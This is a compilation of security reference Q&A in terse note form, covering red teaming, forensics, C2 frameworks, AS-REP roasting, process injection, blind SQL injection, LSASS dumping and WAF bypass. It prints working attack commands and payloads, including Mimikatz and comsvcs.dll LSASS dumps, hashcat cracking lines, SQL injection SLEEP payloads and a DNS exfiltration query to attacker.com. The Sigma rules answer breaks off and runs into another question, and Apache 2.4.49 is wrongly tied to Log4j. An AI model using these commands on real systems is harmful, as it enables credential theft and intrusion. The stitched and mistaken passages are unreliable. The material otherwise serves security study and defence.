What is a red team engagement lifecycle?

Red team engagement lifecycle: structured phases from planning to report; simulate sophisticated adversary; test people, process, and technology. Phase 1 -- Planning: scope agreement: what is in scope (systems, techniques, social engineering, physical?), out of scope (production databases, specific critical systems), geography, time window; rules of engagement: what deconfliction process if blue team detects? What happens if real incident during engagement? Who is the white team (knows about engagement; mediates)? Abort criteria (if tester becomes aware of real attacker); goals: specific objectives (reach domain admin, access finance data, plant persistence on CEO laptop); objectives drive all decisions; get-out-of-jail letter: authorisation document; carry at all times during physical. Phase 2 -- Reconnaissance: OSINT on target organisation; identify: technology stack, email format, key personnel, third-party vendors, physical locations, partner organisations, public IP ranges; infrastructure setup: attacker infrastructure (C2, phishing domain, VPS); configure to look legitimate; operational security: use operational accounts not traceable to testing firm. Phase 3 -- Initial Access: phishing campaign (if in scope): spear phish key personnel; pretexting calls (vishing); watering hole (compromise site target employees visit); public exploit (if internet-facing vulnerable service found); physical (if in scope): tailgating, badge cloning, evil USB drop; goal: initial foothold on single endpoint. Phase 4 -- Foothold and Persistence: install C2 implant; establish persistence (if objective includes persistence); maintain access stealthily; avoid detection by EDR and blue team. Phase 5 -- Internal Reconnaissance: network discovery: subnets, services, domain topology; Active Directory enumeration: BloodHound; trust relationships; high-value targets identified. Phase 6 -- Privilege Escalation and Lateral Movement: escalate from user to local admin to domain admin; lateral movement to targets; chain multiple lower-severity vulnerabilities; follow attack paths toward objectives. Phase 7 -- Objective Completion: demonstrate objective completion (screenshot with evidence); extract data (simulated, not real PII); plant persistence (if objective); stage full attack path documentation. Phase 8 -- Debrief and Reporting: deconfliction: reveal engagement to blue team; review: did blue team detect? What was missed? Technical report: full attack narrative; findings; IoCs generated during engagement; recommendations; executive report: business impact; Purple team debrief: red team walks blue team through each technique; blue team implements detection; retesting detection rules.
What is Shodan and how do security professionals use it?

Shodan: search engine for internet-connected devices; indexes banners and metadata from open ports; used by security professionals and attackers. What Shodan indexes: TCP/UDP banners: responses from open ports (HTTP headers, SSH banners, FTP banners, telnet, Modbus, SCADA protocols); screenshots: VNC, RDP, webcam images; TLS certificates: domain names from Subject Alternative Names; metadata: device type, OS, software, version, location. Shodan use cases for defenders: asset discovery: search for your own IP ranges; find exposed services you did not know about; search: net:192.168.0.0/16 (not useful for public Shodan; use for your public ranges); brand monitoring: search domain name; find subdomains you may have forgotten; find credentials in banners; vulnerability management: search for vulnerable software versions: product:Apache httpd version:2.4.49 (Log4j-affected); find Citrix, Exchange, VPN vulnerabilities before attackers; third-party risk: search partner company IP ranges; assess their exposure; ICS/SCADA discovery: Shodan prominently indexes industrial systems; Modbus devices, Siemens S7, SCADA HMIs; critical infrastructure exposure; incident response: during incident: search C2 IP in Shodan; understand what services attacker hosts; C2 infrastructure research. Shodan search filters: port: (port:22 ssh); country: (country:US); hostname: (hostname:example.com); net: (net:1.2.3.0/24); product: (product:nginx); version: (version:1.18.0); org: (org:Microsoft Corporation); before:/after: (date filters); os: (os:Windows). Shodan CLI: pip install shodan; shodan init API_KEY; shodan search port:22 product:OpenSSH; shodan host 1.2.3.4; shodan scan submit 1.2.3.0/24 (initiate scan of your own network -- requires credits). Defensive actions from Shodan: close unnecessary ports (if Shodan finds open management port: close it); update software (if Shodan reveals old version: patch); remove sensitive banners (SSH version banners reveal OS and software version); Shodan alerts: set up alerts on your IPs/domains; notify when new exposed service found; Shodan Monitor: continuous monitoring of your network assets; alert on changes. Exposure reduction: principle of minimum exposure: only expose services that must be public; VPN for management access; firewall rules: restrict by source IP; remove default banners; ensure no credentials in HTTP responses or banners.
What is network forensics?

Network forensics: capture, preserve, and analyse network traffic to investigate security incidents; reconstruct attacker activities from network evidence. Evidence sources: full packet capture (PCAP): complete network traffic; most comprehensive; storage intensive; network tap or SPAN port; retrospective analysis after incident; netflow/IPFIX: connection-level metadata without payload; src IP, dst IP, port, protocol, bytes, duration; storage efficient; analysis without decryption; DNS logs: queries and responses; reveal C2 domains, data exfiltration via DNS; Zeek (Bro) logs: structured logs from traffic analysis (conn.log, http.log, ssl.log, dns.log, files.log, weird.log); proxy logs: web proxy (Squid, Bluecoat, Zscaler); URL, user agent, bytes, response code; email logs: SMTP logs, mail gateway; firewall/NAT logs: connection attempts, blocked traffic; endpoint network data: EDR network telemetry; process-to-network connection mapping. Tools: Wireshark: GUI PCAP analysis; display filters, protocol dissection, TCP stream reassembly, file extraction; tshark: command-line Wireshark; scripting; large PCAP analysis; tcpdump: capture and filter; Zeek: traffic analysis and log generation from PCAP; NetworkMiner: passive network sniffer; OS and session reconstruction; file extraction; Moloch/Arkime: large-scale PCAP storage and search; elasticsearch backend; Suricata: IDS + network monitoring; signature-based detection on network. Incident investigation workflow: acquire evidence: capture network traffic at time of incident (if real-time); retrieve stored PCAP/netflow from SIEM or network monitoring; identify suspicious activity: correlate with endpoint alerts; find malware C2 communication; identify data exfiltration; timeline reconstruction: first connection from attacker IP; subsequent lateral movement; data access; exfiltration; evidence extraction: extract files from HTTP traffic (malware downloads); decode encoded traffic; document C2 infrastructure. Specific analysis tasks: C2 identification: periodic beaconing (regular interval network connection); identify: Packet timing analysis (consistent intervals), destination (rare/new domain), User-Agent anomalies, encrypted but small regular traffic (Cobalt Strike default 60-second beacon); data exfiltration: large outbound transfers; unusual destination; unusual protocol (DNS tunneling: many small DNS queries); HTTP POST to unusual destination; email exfiltration; lateral movement: SMB connections between workstations (not normal in environment); RDP from non-admin systems; WMI/DCOM traffic to multiple hosts; account credential pass from one host to another (new logon events correlated with network connections). DFIR integration: network forensics corroborates endpoint forensics; endpoint shows process X executed; network shows process X made connection to IP Y at time Z; complete picture of attack chain.
What is secure remote access and VPN security?

Secure remote access: allow employees to access corporate resources from outside office; VPN, ZTNA, and secure access service edge (SASE). VPN types: site-to-site VPN: connect two office networks over internet; permanent tunnel; not user VPN; remote access VPN: individual user connects to corporate network; user experience: as if on corporate network; splits into: full tunnel (all traffic through VPN), split tunnel (only corporate traffic through VPN; internet direct). VPN protocols: IPSec: encryption and authentication at IP layer; tunnel mode: entire IP packet encrypted; transport mode: payload only; IKEv2: fast reconnect; mobile friendly; OpenVPN: open-source; TLS-based; flexible; port 1194 UDP or TCP 443; WireGuard: modern; fast; simple; cryptographically strong; growing adoption; SSL/TLS VPN: uses HTTPS (port 443); web browser or thin client; Cisco AnyConnect, Pulse Secure, GlobalProtect. VPN security vulnerabilities: credential attacks: VPN exposed to internet; brute force without rate limiting; credential stuffing; MFA bypass; CVE-based: critical vulnerabilities in VPN appliances: Pulse Secure, Fortinet, Citrix ADC, Cisco AnyConnect; nation-state exploitation of VPN vulnerabilities; example: Fortinet CVE-2022-40684 (authentication bypass); Pulse Connect Secure CVE-2021-22893; over-privileged VPN access: VPN gives access to everything; attacker with stolen credentials accesses all resources; split tunneling misconfiguration: user manipulates routing to redirect traffic. VPN hardening: MFA on VPN: all VPN connections require MFA (Duo, RSA SecurID, TOTP); hardware token strongest; patch VPN appliance: VPN CVEs actively exploited; highest priority patching; network segmentation post-VPN: VPN lands in restricted zone; lateral movement requires additional authentication; not direct access to all internal resources; logging: log all VPN connections (user, IP, time, duration); alert: new user, unusual time, new geography, concurrent sessions from different geos; certificate authentication: mutual TLS; client certificate + user credentials; split tunneling control: force DNS through VPN (prevent DNS leakage); internet traffic direct or controlled; rate limiting: limit login attempts; IP-based rate limiting; ZTNA (Zero Trust Network Access) replacing VPN: per-application access: user accesses specific application; not entire network segment; continuous verification: session reassessed continuously; context-aware: user + device + location + application; BeyondCorp model (Google); products: Zscaler Private Access, Cloudflare Access, Palo Alto Prisma Access, Cisco Duo Network Gateway.
What is physical penetration testing?

Physical penetration testing: assess physical security controls; attempt unauthorised physical access; complement to network and application pentesting. Why physical testing: physical access = game over; access to server room allows: direct device access, installing hardware implant, stealing drives, rebooting into live OS; social engineering via physical presence most effective attack vector; many organisations underinvest in physical security. Scope: define precisely what is in scope: which offices, what activities (tailgating, pretexting, break-in simulation?), what cannot be done (no actual locks broken, no violence, no damage); authorisation letter: carry at all times; contact for white team (person who can confirm legitimacy to security if detained). Techniques: tailgating / piggybacking: follow authorised person through secured door; hold door open appeal: most employees uncomfortable challenging; RFID cloning: Proxmark3 or Flipper Zero: clone building access RFID badge within RF range; if RFID uses older EM4100/HID Prox 125kHz (no crypto): trivially cloned; HID iCLASS, MIFARE DESFire: more secure; social engineering: pretexting: pose as IT support, HVAC technician, delivery person, fire inspector; create pretext calling ahead; uniform: matching uniforms dramatically increase access success; badge cloning + uniform: high-success combination; dumpster diving: find sensitive documents; old hard drives; credentials on paper; lock picking: pick-resistant (security pin sets): Medeco, Abloy Protec (high security); most corporate locks: standard pin tumbler; pick with standard picks or bump key; shimming: padlocks shimmed with thin metal; not all padlocks secure; dropping devices: USB drives with payloads (O.MG cable, rubber ducky); left in car park, reception area, bathroom; employee curiosity leads to plug-in. Findings: unlocked server rooms: anyone can walk in; weak RFID (125kHz cards): cloneable at distance; no visitor management: visitors not escorted; tailgating: no challenge culture; no anti-tailgating (mantrap); dumpster with sensitive documents; unattended workstations: not locked; screen visible to visitors; network drops accessible in public areas: plug in and access internal network. Remediation: anti-tailgating: culture (challenge policy), mantrap (airlock), turnstiles; RFID upgrade: replace 125kHz with encrypted credentials (HID iCLASS SE, MIFARE DESFire); document shredding: all documents; locked bins before disposal; visitor management: escorts; visitor badges that look different; clean desk policy: no sensitive documents visible; lock workstations (Win+L on leave); network port security (802.1X); CCTV coverage and monitoring.
What is heap exploitation in binary exploitation?

Heap exploitation: abuse dynamic memory management vulnerabilities to achieve arbitrary code execution or memory corruption. Heap basics: dynamic memory allocation (malloc/free/new/delete); allocated chunks stored in heap region; glibc malloc: most common Linux allocator; chunk structure: size field, prev_size, user data, next chunk; free chunks: stored in bins (linked lists) by size; fastbins, unsorted bin, small bins, large bins, tcache. Common heap vulnerabilities: heap buffer overflow: write past end of allocated buffer; overwrite adjacent chunk headers or data; heap use-after-free (UAF): free chunk; continue using freed pointer; reallocated to different object; control attacker-controlled object through old pointer; double free: free same pointer twice; corrupts allocator internal state; tcache double free in modern glibc: trivially detectable (tcache key check); heap underflow: write before start of buffer (less common); type confusion: object interpreted as different type; polymorphism abuse; null pointer dereference (some contexts leads to exploitation if NULL page mappable). Exploitation techniques: tcache poisoning (glibc 2.26+): tcache (thread cache): per-thread singly-linked freelist; double free or write to chunk: overwrite tcache next pointer; next allocation returns arbitrary address (controlled by attacker); write to arbitrary address; example: double free chunk A; overwrite tcache forward pointer with target address; malloc() returns target address; write value to target. Fastbin attack (older glibc): similar to tcache but older; fastbin dup: double free; write to arbitrary address; unsorted bin attack: partially overwrite unsorted bin bk pointer; write large value to arbitrary address; limited but useful for bypassing ASLR (write libc address to heap). Safe unlinking bypass: modern glibc: unlink macro checks P->fd->bk == P; bypass requires fake chunk headers satisfying check. Heap feng shui: carefully control heap layout; position attacker-controlled data adjacent to target data; trigger overflow to corrupt target. Modern mitigations: tcache key: double free detection in tcache; glibc safe-linking (2.32+): next pointer XOR'd with address >> 12; partial ASLR bypass needed to corrupt; randomised heap base (ASLR); heap canaries (some allocators); Guard pages; Defence in depth: multiple mitigations required to bypass in modern systems. Tools: pwndbg (GDB plugin): heap analysis (heap, bins commands); pwntools: exploit development framework (Python); GEF: alternative GDB plugin; heaptrace: trace heap allocations; how2heap (shellphish): educational heap exploitation examples; practice: pwn.college, nightmare, exploit.education.
What is threat hunting with Sigma rules?

Sigma rules: open, vendor-agnostic detection rule format; YAML-based; convert to SIEM query languages; threat hunting and detection engineering. What is cryptography for incident responders?

Cryptography in incident response: understand how attackers use and abuse cryptography; identify encrypted malware, C2, and data. Ransomware cryptography: symmetric + asymmetric hybrid: ransomware generates random AES key per victim; encrypts files with AES-256; encrypts AES key with attacker RSA public key; sends encrypted AES key to attacker C2 or embeds in ransom note; without attacker private RSA key: files unrecoverable; exceptions: weak random number generation (some early ransomware: crypto_random predictable); memory forensics: AES key in memory before ransomware overwrites; specific ransomware bugs: key derivation weakness; nomoreransom.org: free decryptors for many ransomware variants. Malware C2 encryption: Cobalt Strike: HTTPS C2; traffic appears as legitimate HTTPS; JA3 fingerprint identifies Cobalt Strike default profile; custom profiles change JA3; Malleable C2: Cobalt Strike traffic shaping; mimic legitimate software (Slack, GitHub); encrypted payload: malware stores payload encrypted in binary; decrypts in memory at runtime; evades signature detection; detect: unpacking behavior (VirtualAlloc + WriteProcessMemory + CreateRemoteThread); process injection followed by execution. Encrypted traffic analysis: JA3/JA3S fingerprinting: without decrypting TLS: fingerprint TLS handshake; identify malware families by TLS implementation; JARM: server-side TLS fingerprint; identify C2 server; certificate analysis: self-signed certificates in malware C2; certificate details (subject, issuer, validity period, SANs); correlate with threat intelligence; network behaviour: even without decryption: detect C2 by: beacon timing (regular interval), data size patterns (consistent request/response sizes), destination reputation. Encryption key discovery: memory forensics: Volatility: find AES keys in process memory (AES key schedule is identifiable); keylogger capture: keys typed (key input before encryption); disk forensics: key material in temporary files, swap files, hibernation file; cloud key management: if application uses cloud KMS: investigate KMS key usage logs; who accessed keys and when. TLS inspection: some networks have SSL inspection (MITM by proxy); incident responders on inspecting proxy: full cleartext access to application traffic; outside of inspection: rely on metadata analysis; forensic tools: bulk_extractor: finds crypto keys, certificates, URLs in raw memory/disk images; OpenSSL: verify certificate details; decode certificate from network capture.
What is spear phishing and how do you build a resilient anti-phishing programme?

Spear phishing: targeted phishing email crafted for specific individual; uses OSINT about target; higher success rate than generic phishing. What makes spear phishing dangerous: personalised: mentions target name, role, recent activity, colleague names; legitimate-looking sender: domain spoofing, lookalike domain; timely: referenced to current event (tax season, acquisition news, recent conference); authoritative: appears from executive, trusted vendor, government; urgent: creates pressure to act quickly without verification. Spear phishing techniques: executive impersonation (BEC): email appears to come from CEO; instructs finance employee to wire transfer; account takeover: phishing credentials; attacker takes over account; sends further phishing from trusted account; spear phishing with attachment: Word with malicious macro; PDF with embedded JS; ISO/LNK files (modern delivery); spear phishing with link: credential harvesting page; fake login page (identical to Microsoft, Google login); SaaS phishing: OneDrive link, DocuSign, SharePoint; Microsoft/Google OAuth consent phishing: malicious OAuth app; user grants permissions; attacker accesses email without password. Anti-phishing technical controls: DMARC: domain-based message authentication; domain: example.com sets DMARC policy; receiving server: check SPF and DKIM; if neither pass: DMARC policy applies (quarantine, reject); SPF: lists authorised sending IPs for domain; DKIM: cryptographic signature from sending domain; DMARC reject: strongest; bounces unauthenticated email; eliminates domain spoofing; but: does not prevent lookalike domains (examp1e.com); email gateway: advanced threat protection: Proofpoint, Mimecast, Microsoft Defender for Office 365; sandboxing attachments: detonate in VM; analyse behaviour; URL rewriting: replace URLs with proxy; check at click-time; block malicious URLs discovered after delivery; anti-spoofing: external email banner (This email is from an external sender); display name check: CEO name with external email (flag this is not your CEO internal email); browser protection: Microsoft SmartScreen, Google Safe Browsing; warn on known phishing sites. People controls: security awareness training: phishing simulation; immediate training on click; repeat training for repeat clickers; verify before act: process: for wire transfer requests: phone verification using known number (not number in email); finance SOP: no wire transfer authorisation via email only; verify requests to change vendor bank details via phone; reporting: easy phish report button (Microsoft Report Message, Proofpoint PhishAlarm); celebrate reporters; investigate reports quickly; executive awareness: targeted training for executives and finance; vishing awareness (phone call pretexting complementing phishing). Measuring programme: monthly phishing simulation click rate; phishing report rate (% who report simulation); mean time to report (MTTR from receipt to report); email gateway block rate; real phishing incidents per quarter.
What is Kerberos AS-REP roasting?

AS-REP Roasting: attack against accounts with pre-authentication disabled; obtain AS-REP hash; crack offline; no authentication required. Kerberos pre-authentication: default: before issuing TGT, KDC requires proof of password knowledge; client sends encrypted timestamp with password hash; KDC verifies; if pre-auth disabled: KDC issues TGT without verifying requester has password; AS-REP Roasting: attacker requests TGT for any user with pre-auth disabled; KDC responds with AS-REP; AS-REP contains session key encrypted with user password hash; attacker has encrypted data; crack offline with dictionary attack; similar to Kerberoasting but: no authentication required (unauthenticated attack from network); target accounts with pre-auth disabled (vs Kerberoasting: all accounts with SPN). Who has pre-auth disabled: accounts configured with Do not require Kerberos preauthentication attribute in AD; some services require this for compatibility (older protocols); misconfiguration; should be exceptions not norm. Exploitation: GetNPUsers.py (Impacket): python3 GetNPUsers.py DOMAIN/ -no-pass -usersfile userlist.txt -dc-ip DC_IP (test list of users without auth); or with domain user: python3 GetNPUsers.py DOMAIN/user:password -request; Rubeus: Rubeus.exe asreproast /format:hashcat (collect from joined domain); output: $krb5asrep$23$username@DOMAIN:HASH format for hashcat; cracking: hashcat -m 18200 asrep_hashes.txt wordlist.txt (mode 18200 for krb5asrep); hashcat -m 18200 hash.txt rockyou.txt -r rules/best64.rule. Prevention: re-enable pre-authentication: identify all accounts with pre-auth disabled (Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth); enable pre-auth unless specifically required; if required: use very strong password (makes offline crack infeasible); monitoring: Event 4768 (AS-REP): look for requests with PA-ENC-TIMESTAMP not present (indicator of pre-auth disabled account request); honey account with pre-auth disabled: any AS-REP request for honey account = alert. Compared to Kerberoasting: Kerberoasting: requires authentication to DC first; targets accounts with SPN; AS-REP Roasting: no authentication required; targets accounts with pre-auth disabled; both: offline cracking; password strength defence; detection via event logs.
What is code injection and how does it work?

Code injection: inject malicious code into running process; execute attacker code in context of target process; broad category including many specific techniques. Process injection overview: attacker has foothold on system; wants to execute code in context of another process; reasons: privilege level of target process (SYSTEM), evade EDR (code running in trusted process), persistence, C2 communication hiding. Key techniques: DLL injection: OpenProcess: get handle to target; VirtualAllocEx: allocate memory in target; WriteProcessMemory: write DLL path; CreateRemoteThread: start thread calling LoadLibrary with DLL path; target process loads attacker DLL; DLL executes in target context; process hollowing: create new process (suspended): CreateProcess with CREATE_SUSPENDED; NtUnmapViewOfSection: unmap legitimate binary from process memory; VirtualAllocEx + WriteProcessMemory: write malicious binary; SetThreadContext: set entry point to malicious code; ResumeThread: start execution; appears as legitimate process (svchost.exe, explorer.exe) hosting malicious code; process doppelganging: uses NTFS transactions; create transacted file (not committed to disk); write malicious binary to transaction; map into process; rollback transaction; malicious binary never on disk; evades file-based AV; atom bombing: use Windows atom table as shared memory; write shellcode to atom table; APC injection via atom table; inject into target thread; reflective DLL injection: DLL loads itself from memory; no LoadLibrary call (no trace in module list); DLL implements its own loader; Meterpreter uses reflective injection; early bird injection: inject before process main function; code runs before EDR hooks set. Shellcode injection generic: VirtualAllocEx RWX: allocate RWX (readable, writable, executable) memory; write shellcode; CreateRemoteThread or QueueUserAPC; RWX memory allocation suspicious (EDR trigger). Thread execution hijacking: OpenThread + SuspendThread; GetThreadContext: save current context; modify RIP/EIP to shellcode; SetThreadContext; ResumeThread. Detection: Sysmon Event 8 (CreateRemoteThread): thread created in another process; Sysmon Event 10 (ProcessAccess): process opening handle to another process with VM read/write; EDR behaviour: unusual process memory allocations, RWX regions; cross-process injection sequence; memory scanning: EDR scans process memory for shellcode signatures (PE headers in non-module memory, suspicious patterns); Defence: Credential Guard: uses VBS (Virtualization Based Security); code injection into LSASS blocked by kernel guard; HVCI (Hypervisor Protected Code Integrity): prevents unsigned code running in kernel; blocks most kernel-level injection; ETW (Event Tracing for Windows): trace all system calls; detect injection API sequences; Memory protections: CFG (Control Flow Guard): validates indirect call targets; prevents arbitrary code pivot.
What is a red team command and control (C2) framework?

C2 framework: infrastructure for maintaining communication with compromised hosts; issue commands; exfiltrate data; manage implants. C2 components: implant (beacon/agent): runs on compromised host; communicates with team server; listens for commands; executes and returns results; team server: attacker-controlled server; receives implant connections; management interface; operator connects to team server; operator: attacker/red teamer using team server to issue commands. Popular frameworks: Cobalt Strike: commercial; most widely used in red teams and APTs; Malleable C2: customise beacon traffic to mimic legitimate software; features: lateral movement, credential extraction, post-exploitation, team collaboration; licensed; Metasploit (Meterpreter): free; Rapid7-maintained; powerful post-exploitation; well-known signatures; Empire (PowerShell Empire): PowerShell and Python agents; free; stealthy PowerShell agent; detection has improved; Sliver: open-source (Bishop Fox); modern design; mTLS, WireGuard, HTTP/S, DNS transport; Havoc: open-source; newer; Rust-based; Brute Ratel C4: commercial; designed to evade EDR; expensive; OPSEC-focused; Nighthawk: commercial; enterprise; evasive. C2 communication channels: HTTP/HTTPS: most common; blends with legitimate traffic; HTTPS: encrypted (inspector needs SSL inspection); DNS: DNS over UDP; slow; bypasses many firewalls; useful as fallback; SMB (named pipes): peer-to-peer C2; no internet required; lateral movement only; good for segmented networks; custom protocols: Cobalt Strike Malleable C2: configure to mimic Slack, GitHub, jQuery CDN; attacker-controlled domains with valid TLS. C2 infrastructure: redirectors: cloud VPS between target network and team server; if redirector blocked: not attributed to team server; Apache mod_rewrite or Nginx: redirect beacon traffic; non-beacon traffic: redirect to legitimate site; domain fronting: legitimate CDN (Cloudflare, Azure CDN) as redirector; CDN forwards to team server; hard to block (must block legitimate CDN); increasingly detected and blocked by CDN providers; domain categorisation: use old domains with established category (IT/technology); new domains flagged as suspicious. OPSEC: operational security for red team infrastructure: separate infrastructure per engagement; domain age and reputation; clean infrastructure not previously flagged; rotate if detected; keep team server protected; restrict access to known IPs. Detection: JA3/JA3S: Cobalt Strike has recognisable TLS fingerprint; Malleable C2 changes HTTP but TLS similar; JARM: server-side fingerprint identifies Cobalt Strike team servers; URI patterns: Cobalt Strike default URI patterns recognisable (/submit.php, etc.); network behaviour: periodic beaconing; consistent data sizes; Sysmon: parent-child process anomalies; process injection by implant; cross-process handle opening; EDR: memory scanning for implant signatures; hook detection; ETW telemetry.
What is security in a zero trust architecture?

Zero Trust Architecture (ZTA): never trust, always verify; assume breach; verify every access request regardless of network location; microsegmentation; least privilege. Core principles: verify explicitly: authenticate and authorise based on all available data: user identity, device health, location, application, service, data classification; use least privileged access: limit user access with just-in-time and just-enough-access; limit blast radius; use session-based access; assume breach: minimise blast radius and segment access; verify end-to-end encryption; use analytics to get visibility, drive threat detection and improve defences. Zero Trust pillars: identity: strong authentication for all users; MFA; continuous session validation; contextual access policies; identity as primary security control; device: device health validation before access; MDM/EDR compliance check; device certificate; managed vs unmanaged device policy; network: microsegmentation; software-defined perimeter; no implicit trust for internal network; encrypt all traffic (even internal); application: application-level access controls; application-aware access gateway; WAF; API security; data: classify data; apply controls based on classification; DLP; encryption at rest and in transit; visibility and analytics: SIEM; UEBA; SOAR; logs from all pillars. Implementation path: no single product; architecture shift; steps: inventory all applications and data; identify all access flows; implement strong identity (MFA for all, conditional access); device compliance checking (MDM, EDR); segment network (microsegmentation or ZTNA for remote access); implement least privilege access (RBAC, JIT); encrypt all traffic; implement logging and monitoring across all pillars; reference architectures: NIST SP 800-207: Zero Trust Architecture; CISA Zero Trust Maturity Model: 5 pillars, 4 maturity stages (Traditional, Initial, Advanced, Optimal); DoD Zero Trust Strategy: US government implementation guide; NIST ZTA architecture types: agent-based (software on device verifies), enclave-based (micro-perimeter), service mesh (API-to-API ZT). Products: identity and access: Microsoft Entra ID (Conditional Access), Okta (Adaptive MFA), Ping Identity; ZTNA: Zscaler Private Access, Cloudflare Access, Prisma Access; network segmentation: Illumio, Akamai Guardicore, Cisco Microsegmentation; device trust: Microsoft Intune, Jamf (macOS/iOS), CrowdStrike Device Trust; visibility: Microsoft Sentinel (ZT monitoring), Splunk; no single vendor covers all pillars; multi-vendor architecture required.
What is SQL injection time-based blind exploitation?

Time-based blind SQL injection: no data visible in response; infer data from response time; if payload causes delay = condition true. When to use: error-based: database errors reveal data; union-based: inject SELECT returns data in response; Boolean-blind: true condition changes response body; time-based blind: none of above available; completely blind; only observable difference is response time. How it works: inject time-delay function with conditional: MySQL: ' AND SLEEP(5) -- (unconditional: always delays 5 seconds); conditional: ' AND IF(1=1, SLEEP(5), 0) -- (if 1=1 is true: sleep 5 seconds; else: return immediately); ' AND IF(SUBSTRING(user(),1,1)='r', SLEEP(5), 0) -- (if first char of user() is r: sleep 5s); measure response time; if sleep occurs: condition true; binary search: extract data character by character: is ASCII value of first char of database() > 100? (5 second delay = yes); is it > 75? (no delay = no); etc. Database-specific syntax: MySQL: SLEEP(5); PostgreSQL: pg_sleep(5); SELECT CASE WHEN (condition) THEN pg_sleep(5) ELSE 0 END; MSSQL: WAITFOR DELAY 0:0:5; IF(condition) WAITFOR DELAY 0:0:5; Oracle: dbms_pipe.receive_message(chr(1),5); BEGIN IF condition THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(1),5); END IF; END; SQLite: usually no time delay; use Boolean blind instead. sqlmap automation: sqlmap -u http://target.com/page?id=1 --technique=T (time-based only); sqlmap -u http://target.com/page?id=1 --dbms=mysql --dump; --time-sec=10 (set timeout threshold); sqlmap handles payload construction and binary search automatically. Manual extraction: burp intruder: payload: ' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>PLACEHOLDER, SLEEP(5), 0) --; placeholder: 0, 32, 64, 96, 112, 120, 124 (binary search); record response time per payload; > 5 second response = condition true. OOB (Out-of-Band) alternative: if intranet and DNS allowed: LOAD_FILE or SELECT into outfile via DNS; MySQL: SELECT LOAD_FILE(CONCAT(\\, SELECT database(),.attacker.com\test)); DNS query encodes data; faster than time-based; requires network egress for DNS. Mitigation: parameterised queries (same as all SQL injection); least privilege database user: if no write access, no SLEEP function access (some databases restrict timer functions by privilege).
What is API gateway security?

API gateway security: API gateway as security control point for all API traffic; enforce authentication, rate limiting, and monitoring at the edge. API gateway functions (security perspective): authentication: validate API key, JWT, OAuth token before request reaches backend; reject invalid credentials at gateway; authorisation: coarse-grained: does this client have access to this endpoint at all?; fine-grained: handled at service level; rate limiting: limit requests per API key or IP; protect backend from abuse; request validation: validate request schema (JSON schema, OpenAPI spec); reject malformed requests; SSL termination: decrypt HTTPS; inspect plaintext; re-encrypt to backend (or internal cleartext if trusted network); WAF integration: some gateways include WAF; filter OWASP Top 10 attacks; logging: all requests logged; API analytics; abuse detection; transformation: modify requests/responses; strip internal headers; add auth headers; product examples: AWS API Gateway + WAF; Kong Gateway (open-source + enterprise); Apigee (Google Cloud); Azure API Management; Nginx API Gateway; Traefik; MuleSoft. JWT validation at gateway: gateway validates JWT signature; checks expiry (exp), issuer (iss), audience (aud); rejects invalid tokens before backend sees request; backend can trust token has been validated; performance: validation at gateway; backend does not re-validate; API key management: issue API keys to clients; associate key with: rate limit, allowed endpoints, quota; rotate keys without changing client code; revoke compromised keys immediately; key analytics: which clients make most requests; abnormal usage patterns. Common gateway vulnerabilities: authentication bypass: if endpoint not protected at gateway but accessible directly (internal path bypasses gateway); test: direct backend access; parameter pollution: gateway validates parameter; backend sees different parameter value (different parsing); injection via gateway headers: X-Forwarded-For injection if gateway trusts client-provided headers; ensure gateway sets X-Forwarded-For, X-Real-IP from actual connection; gateway misconfiguration: path traversal in route matching; wildcard routes too permissive; defence in depth: gateway + service-level auth: even with gateway auth, individual services should validate tokens; if gateway misconfigured or bypassed: service auth is last line of defence.
What is Windows credential access via LSASS?

LSASS (Local Security Authority Subsystem Service): Windows process storing credential material; primary target for credential theft. What LSASS stores: NTLM hashes: for currently or recently logged-in users; Kerberos tickets: TGTs and service tickets; cleartext passwords: WDigest authentication (legacy); DES/RC4 encrypted passwords; credential cache: domain credentials for offline authentication; LM hashes (very legacy); tools to access: Mimikatz (most famous): sekurlsa::logonpasswords (dump all credential material from LSASS); requires: local administrator + SeDebugPrivilege; mechanism: OpenProcess on LSASS (PID); ReadProcessMemory; parse credential structures; output: usernames, domains, NTLM hashes, cleartext passwords if WDigest enabled; Procdump (Sysinternals): dump LSASS memory to file: procdump.exe -ma lsass.exe lsass.dmp; copy dump off-target; parse offline with Mimikatz: sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords; avoid real-time Mimikatz detection by dumping and parsing offline; alternative dump methods: Task Manager: Create Dump File on LSASS (admin); comsvcs.dll: rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump LSASS_PID lsass.dmp full; Out-Minidump.ps1 (PowerSploit): PowerShell-based dump; SQLDumper.exe: Microsoft binary dumping LSASS; RPC-based dump: Windows APIs to dump via RPC (bypasses some EDR hooks). Defences: Credential Guard: isolates LSASS in Virtualization Based Security (VBS); LSA Isolated: LSASS secrets in VSM (Virtual Secure Mode); Mimikatz cannot read VBS-protected secrets; highly effective; requires UEFI + VT-d/AMD-Vi; Disable WDigest: prevent cleartext password caching: HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest UseLogonCredential = 0; Protected Process Light (PPL): LSASS runs as PPL; blocks most dump methods; Mimikatz PPL bypass exists but detectable; Windows Credential Guard: must be enabled via Group Policy; modern Windows (Windows 10 1703+, Server 2016+); EDR detection: Sysmon Event 10: LSASS process access; alert on: OpenProcess to LSASS with PROCESS_VM_READ; Sysmon Event 1: procdump.exe or comsvcs.dll with lsass in command; EDR: LSASS memory access detection; Defender for Identity: detects Mimikatz over the network (remote LSASS dump via network); Sysmon config: TargetImage contains lsass.exe and GrantedAccess = 0x1010 (VM read + query limited); alert immediately.
What is web application firewall (WAF) bypass?

WAF bypass: circumvent web application firewall detection to deliver attack payload; test WAF effectiveness or bypass in penetration testing. Why bypasses work: WAF uses pattern matching and signatures; attackers craft payloads that match attack intent but not WAF signature; encoding, obfuscation, and alternative syntax achieve same attack with different bytes. Common bypass techniques: encoding: URL encoding: %3Cscript%3E bypasses filter for <script>; double URL encoding: %253Cscript%253E (server decodes twice); HTML entities: <script> (HTML entity for <script>); Unicode: \u003cscript\u003e; base64 + eval (if WAF does not decode base64); case variation: <ScRiPt>alert(1)</sCrIpT> (if WAF case-sensitive); whitespace: SQL: SELECT/**/1/**/FROM/**/users; tab instead of space: SELECT	FROM; newline: SELECT
